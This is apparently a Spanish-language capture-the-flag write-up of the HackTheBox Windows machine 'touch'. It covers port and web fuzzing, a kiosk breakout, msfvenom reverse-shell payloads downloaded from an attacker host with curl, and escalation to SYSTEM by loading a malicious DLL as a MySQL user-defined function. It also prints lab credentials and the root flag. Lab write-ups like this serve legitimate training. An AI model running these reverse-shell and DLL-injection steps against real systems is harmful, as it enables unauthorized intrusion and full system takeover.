---
title: HTB writeup test
published: true
---

Hoy estaremos resolviendo la maquina touch de HTB que es Windows y de dificultad facil, en la pagina de HackTheBox nos dan unas credenciales de inicio `Jenny Crawford:KS7X2M`

Empezamos con el escaneo de puertos con nmap

```bash

nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.129.129.197 -oG allPorts

135/tcp open msrpc syn-ack ttl 127 
3389/tcp open ms-wbt-server syn-ack ttl 127 
5985/tcp open wsman syn-ack ttl 127 
8443/tcp open https-alt syn-ack ttl 127

```

Al acceder al sitio por el puerto `8443` solo vemos lo siguiente 

<div align="center">
  <img src="/assets/cap.png" alt="Descripción" width="300" />
</div>


Al inspeccionar el codigo fuente podemos visualizar lo siguiente

![Texto alternativo de la imagen](/assets/cap2.png)

Al parecer la contraseña por defecto es el serial number

Al empezar a fuzzear encontramos lo siguiente

```bash

wfuzz -c --hw=0 --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.129.129.197:8443/FUZZ

Target: http://10.129.129.197:8443/FUZZ
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000039:   200        2 L      124 W      3570 Ch     "login"
000001012:   403        0 L      2 W        35 Ch       "api"

```

Al hacer fuzzing ahora hacia `/api` encontramos `/status`

```bash

wfuzz -c --hw=0 --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.129.129.197:8443/api/FUZZ

Target: http://10.129.129.197:8443/api/FUZZ
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000750:   200        0 L      3 W        116 Ch      "status"
```

Al acceder al endpoint `/api/status` encontramos el serial number que nos sirven para iniciar sesion en el panel que anteriormente vimos

<div align="center">
  <img src="/assets/cap3.png" alt="Descripción" width="600" />
</div>

Al acceder al panel tenemos ver que a la izquierda hay varias opciones pero lo mas interesante es que podemos visualizar credenciales en texto claro
`KioskUser:K!0sk2026#`

<div align="center">
  <img src="/assets/cap4.png" alt="Descripción" width="600" />
</div>

Al intentar conectarme por rdp con 

```bash

xfreerdp /v:10.129.129.197 /u:KioskUser /p:'K!0sk2026#'

```
 
Nos abre lo siguiente y podemos usar las credenciales que nos da HackTheBox en la pagina

<div align="center">
  <img src="/assets/cap5.png" alt="Descripción" width="600" />
</div>

Al completar los campos nos lleva a otro apartado en donde nos pide escanear un documento y al intentarlo tira error 

<div align="center">
  <img src="/assets/cap6.png" alt="Descripción" width="600" />
</div>

Pero desde el panel web al que tenemos acceso podemos controlar el escaner, podriamos apagarlo y ver si cambia algo al no existir el escaner 

<div align="center">
  <img src="/assets/cap7.png" alt="Descripción" width="600" />
</div>

Al volver a llenar los campos ahora nos tira un error

<div align="center">
  <img src="/assets/cap8.png" alt="Descripción" width="600" />
</div>

Si le damos click al enlace nos salimos del cuadro donde no podiamos hacer nada mas y nos lleva al navegador 

<div align="center">
  <img src="/assets/cap9.png" alt="Descripción" width="600" />
</div>

Desde el navegador podriamos abrir el cmd.exe presionando Ctrl + O

<div align="center">
  <img src="/assets/cap10.png" alt="Descripción" width="600" />
</div>

Se nos descargara cmd.exe y al hacer click podemos usarla

<div align="center">
  <img src="/assets/cap11.png" alt="Descripción" width="600" />
</div>

Desde esa consola no podemos hacer gran cosa, ganaremos acceso mediante una revshell con msfvenom 

```bash

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.xx.xx LPORT=443 -f exe -o revshell.exe

```

```bash

msfconsole

use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.xx.xx
set LPORT 443
exploit

```

Una vez hecho eso y nuestro oyente listo pasaremos la revshell hacia la maquina destino nos pondremos en escucha con python en nuestra maquina atacante 

```bash

python3 -m http.server 80

```

Y desde la maquina victima haremos curl para descargar nuestra shell maliciosa

```bash

curl http://10.10.xx.xx/revshell.exe -o rev.exe

```
Y ejecutaremos la revshell que descargamos 

```bash

.\rev.exe

```

Y ya estaria, tenemos una shell mas completa en nuestro oyente de metasploit donde podemos leer nuestra flag de usuario en /Desktop

Al dirigirnos hacia `C:\ProgramData\HTB Airways` encontramos varios ficheros pero al `leer refresh-dates.bat` nos nos encontramos con

```bash

C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026 < "C:\ProgramData\HTB Airways\refresh-dates.sql" 2>/dev/null

```

Validaremos las credenciales que tenemos

```bash

C:\MySQL\bin>.\mysql.exe -u root -pHTB@irw4ys_DB!2026 -e "SHOW DATABASES;"
.\mysql.exe -u root -pHTB@irw4ys_DB!2026 -e "SHOW DATABASES;"
mysql: [Warning] Using a password on the command line interface can be insecure.
Database
htb_airways
information_schema
mysql
nexion_devices
performance_schema
sys

```

Validamos si la funcion `sys_exec` esta activada pero no lo esta

```bash

C:\MySQL\bin>.\mysql.exe -u root -pHTB@irw4ys_DB!2026 -D htb_airways -e "SELECT sys_exec('whoami');"
.\mysql.exe -u root -pHTB@irw4ys_DB!2026 -D htb_airways -e "SELECT sys_exec('whoami');"
mysql: [Warning] Using a password on the command line interface can be insecure.
ERROR 1305 (42000) at line 1: FUNCTION htb_airways.sys_exec does not exist

```

Al verificar si hay UDF ativas no nos muestra nada

```bash

C:\MySQL\bin>.\mysql.exe -u root -pHTB@irw4ys_DB!2026 -D htb_airways -e "SELECT * FROM mysql.func;"
.\mysql.exe -u root -pHTB@irw4ys_DB!2026 -D htb_airways -e "SELECT * FROM mysql.func;"
mysql: [Warning] Using a password on the command line interface can be insecure.

```

Al hacer 

```bash

C:\MySQL\lib\plugin>mysql.exe -u root -pHTB@irw4ys_DB!2026 -e "SHOW VARIABLES LIKE 'secure_file_priv'; SHOW VARIABLES LIKE 'plugin_dir';"
mysql.exe -u root -pHTB@irw4ys_DB!2026 -e "SHOW VARIABLES LIKE 'secure_file_priv'; SHOW VARIABLES LIKE 'plugin_dir';"
mysql: [Warning] Using a password on the command line interface can be insecure.
Variable_name   Value
secure_file_priv        NULL
Variable_name   Value
plugin_dir      C:\\MySQL\\lib\\plugin\\

```

vemos que `secure_file` esta en `NULL`, por lo que una carga de una dll directa no podemos hacer, sin embargo podemos tomar el camino alternativo de `CREATE FUNCTION` en donde podriamos inyectar nuestra dll maliciosa en `plugin_dir` y ejecutarla por medio de `MySQL`, entonces vamos a intentarlo 

Primero creamos nuestra dll maliciosa 

```bash

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.xx.xx LPORT=444 -f dll -o shell.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 9216 bytes
Saved as: shell.dll

```

En la maquina victima descargamos nuestra dll en el directorio `C:\MySQL\lib\plugin`

C:\MySQL\lib\plugin>curl http://10.10.xx.xx/shell.dll -o shell.dll
curl http://10.10.xx.xx/shell.dll -o shell.dll
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100   9216 100   9216   0      0  31282      0                              0

Y nos ponemos en escucha en nuestra maquina atacante


```bash
rlwrap nc -lnvp 444

```

Y en la maquina victima activamos nuestra dll

```bash

C:\MySQL\lib\plugin>C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026 -e "DROP FUNCTION IF EXISTS sys_exec; CREATE FUNCTION sys_exec RETURNS INT SONAME 'shell.dll';"
C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026 -e "DROP FUNCTION IF EXISTS sys_exec; CREATE FUNCTION sys_exec RETURNS INT SONAME 'shell.dll';"
mysql: [Warning] Using a password on the command line interface can be insecure.

```
Y ya estaria, en nuestro rlwrap deberiamos tener nuestra revshell como admin

```bash

nc -lnvp 444
listening on [any] 444 ...
connect to [10.10.xx.xx] from (UNKNOWN) [10.129.129.197] 57051
Microsoft Windows [Version 10.0.26100.9457]
(c) Microsoft Corporation. All rights reserved.

C:\MySQL\data>whoami
whoami
nt authority\system

C:\MySQL\data>

```
Y obtenemos la flag de root 

```bash
C:\MySQL\data>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
7e638a56bb54c246208bf356951852f5

C:\MySQL\data>  

```

